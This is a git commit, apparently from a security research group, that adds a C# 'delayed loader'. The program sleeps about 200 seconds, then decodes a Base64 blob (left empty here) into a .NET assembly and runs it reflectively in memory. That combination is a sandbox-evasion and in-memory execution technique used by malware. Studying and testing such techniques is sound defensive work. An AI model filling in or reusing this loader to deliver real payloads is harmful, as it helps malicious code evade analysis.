f62fd1f9c96a7d0b3f5730b3e4b7049518ea127a
Manuel Blatt <manuel.blatt@fkie.fraunhofer.de>
2022-06-09 18:12:26 +0200

    add delayed loader

---
+++ delayed_loader/Program.cs
@@ -0,0 +1,31 @@
+﻿class DelayedLoader
+{
+
+    static void Main(string[] args)
+    {
+        System.Console.WriteLine("Sleeping ...");
+        System.Threading.Thread.Sleep(200000);
+        System.Console.WriteLine("Sleep is over!");
+
+        string s = "";
+
+        byte[] assemblyBytes = System.Convert.FromBase64String(s);
+            
+        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(assemblyBytes);
+        System.Console.WriteLine("Loaded Assembly");
+        assembly.EntryPoint.Invoke(null, new object[]{ args });
+        System.Console.WriteLine("Assembly was executed");
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
